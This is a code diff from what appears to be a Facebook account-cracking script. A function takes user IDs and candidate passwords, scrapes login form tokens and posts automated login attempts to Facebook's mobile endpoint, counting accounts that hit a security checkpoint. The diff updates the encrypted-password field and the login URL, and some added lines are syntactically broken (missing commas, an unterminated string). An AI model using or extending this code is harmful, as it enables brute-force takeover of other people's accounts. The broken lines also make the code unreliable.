@@ -897,12 +897,12 @@ def m1(idf,pwv):
             session = requests.Session()
             pw = pw.lower()
             get = session.get(f"https://m.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
-            date = {
-            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
-            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
-            "email":idf,"pass":pw,"Host":"https://m.prod.facebook.com/login/save-device/?login"}
+            date = {'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'email': idf,
+            'login_source': 'comet_headerless_login'
+            'next':' 
+            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),} 
             respons =({
             'Host': f'm.facebook.com',
            'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
@@ -918,7 +918,7 @@ def m1(idf,pwv):
            'x-xss-protection': '0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0'})
-            yz = session.post(f'https://x.facebook.com/login/device-based/regular/login', headers=respons, data=date)
+            yz = session.post(f'https://m.facebook.com/login/device-based/regular/login', headers=respons, data=date)
             if "checkpoint" in session.cookies.get_dict().keys():
              idd = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
              cp+=1
